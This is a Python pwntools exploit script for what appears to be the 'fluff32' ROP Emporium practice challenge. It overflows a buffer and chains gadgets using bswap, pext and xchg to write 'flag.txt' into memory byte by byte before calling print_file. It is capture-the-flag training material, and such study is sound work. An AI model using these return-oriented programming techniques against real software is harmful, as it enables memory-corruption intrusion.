#!/usr/bin/python3

from pwn import *

PROG_NAME = "./fluff32"
p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
    gdb.attach(p, '''break main''')

CONST = 0xb0bababa
BITS_IN_CHAR = 8
BITS_IN_32BIT_REG = 32

data_addr = 0x0804a018
pop_bswap_ecx_addr = 0x08048558     # pop ecx; bswap ecx; ret;
pop_ebp_addr = 0x080485bb           # pop ebp; ret;
mov_ebp_pext_addr = 0x08048543      # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
xchg_ptr_ecx_dl_addr = 0x08048555   # xchg BYTE PTR [ecx], dl; ret;

# generates a mask such that when it is used for a `pext`
# instruction on the data, we get the original character back
# "c" is an 8 bit character
# "data" is a 32 bit integer
def generate_mask(c, data):
    c = ord(c)
    mask = 0
    c_i = d_i = 0

    while c_i < BITS_IN_CHAR and d_i < BITS_IN_32BIT_REG:
        c_bit = 1 << c_i
        d_bit = 1 << d_i

        # we will only set 8 mask bits, for each bit
        # of the character.
        # this will be whenever we find a char bit
        # matching the data bit (both 1s or both 0s),
        # because we know that whenever we encounter this 
        # bit in the data, we want to keep it as part of
        # the final char output of `pext`

        if (c & c_bit) and (data & d_bit):
            mask |= d_bit
            c_i += 1
        elif not ((c & c_bit) or (data & d_bit)):
            mask |= d_bit
            c_i += 1
        d_i += 1

    return mask

p.recvuntil(b'> ')
payload = b'A' * (0x28 + 0x4)

for i, c in enumerate('flag.txt'):
    # build our string, 1 char at a time
    payload += p32(pop_bswap_ecx_addr)
    payload += p32(data_addr+i, endian='big')
    payload += p32(pop_ebp_addr)
    payload += p32(generate_mask(c, CONST))
    payload += p32(mov_ebp_pext_addr)
    payload += p32(xchg_ptr_ecx_dl_addr)

# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)
p.interactive()
